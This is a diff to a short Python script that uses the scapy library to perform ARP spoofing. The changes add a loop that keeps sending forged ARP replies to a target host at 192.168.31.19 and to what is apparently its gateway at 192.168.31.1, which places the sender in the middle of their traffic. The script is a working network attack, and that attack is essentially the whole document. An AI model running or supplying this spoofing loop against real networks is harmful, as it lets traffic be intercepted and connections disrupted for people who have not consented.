@@ -1,4 +1,5 @@
 import scapy.all as scapy 
+import time
 
 #Function to get Macaddress of a device which is at a particualr IP
 def getMac(ip):
@@ -18,10 +19,14 @@ def getMac(ip):
 #Function to send arp spoof packets
 def spoof(targetip,sourceip):
     #Get macaddress of terget device
-    targetmac = getMac(targetip)
+    targetMac = getMac(targetip)
     #Create ARP response packet
     packet = scapy.ARP(op=2,pdst=targetip, hwdst=targetMac, psrc=sourceip)
     #Send ARP response packet
     scapy.send(packet)
 
-getMac("192.168.31.19")
+while True:
+    spoof("192.168.31.19", "192.168.31.1")
+    spoof("192.168.31.1", "192.168.31.19")
+    time.sleep(2)
+
